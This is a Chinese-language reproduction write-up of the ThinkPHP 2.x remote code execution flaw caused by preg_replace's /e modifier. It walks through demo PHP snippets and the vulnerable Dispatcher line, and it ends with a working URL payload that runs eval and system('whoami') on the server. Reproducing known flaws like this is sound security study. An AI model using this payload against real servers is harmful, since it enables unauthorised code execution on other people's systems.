### ThinkPHP2-RCE漏洞复现

**影响版本：PHP 5.2~5.6**

/e 修 正符使 preg_replace() 将 replacement 参数当作 PHP 代码(在适当的逆向引用替换完之后)。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错 误。

在ThinkPHP ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由：

```php
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```

导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。

例如：

```php
<?php
$a = "abc";
$b = "aaaachummercaaaa";
echo preg_replace("/c(.+?)c/e",$a,$b);
?>;
```

输出：aaaaabcaaaa;

如果`$a`可控，如下：

```php
<?php
$a = 'print_r("AAA");';
$b = "aaaac123caaaa";
echo preg_replace("/c(.+?)c/e",$a,$b);
?>;
```

输出如下：

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220608091047.png)

由此可见，preg_replace()函数在匹配时，会自动执行replacement。



我们在对代码进行修改

```php
<?php
function test($str){
    return "$str";
}
$a = "test('\1');";
$b = "aaaac${@print_r('AAA')}caaaa";
preg_replace("/c(.+?)c/e",$a,$b);
?>;
```

输出：![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220608091508.png)

通过上图可以看到，如果`$b`可控，匹配到的字符串传递给了test函数,并将返回值给了`$a`，从而控制`$a`。这样就可以通过`preg_replace()`的/e修饰符执行可控参数了。

**然而，/e修饰符在php版本为5.2~5.6时才可使用。**



再回来看ThinkPHP2漏洞的出现点：

ThinkPHP/Lib/Think/Util/Dispatcher.class.php:102

```php
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
            $_GET   =  array_merge($var,$_GET);
```

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220608093526.png)

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220608093659.png)

其中的`$var`为前面定义的一个数组。

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220608094338.png)

将两个匹配到的字符串分别复制给`$var`的key和value，/e修饰符使其能够执行。

`$paths`定义如下：

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220608095140.png)

它的功能是返回URL后面的参数

thinkphp路由的格式是分组/模块/操作名/参数

因此构造payload：

```
?s=/a/b/c/${@eval($_GET[1])}&1=system(%27whoami%27);
```

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220608100320.png)
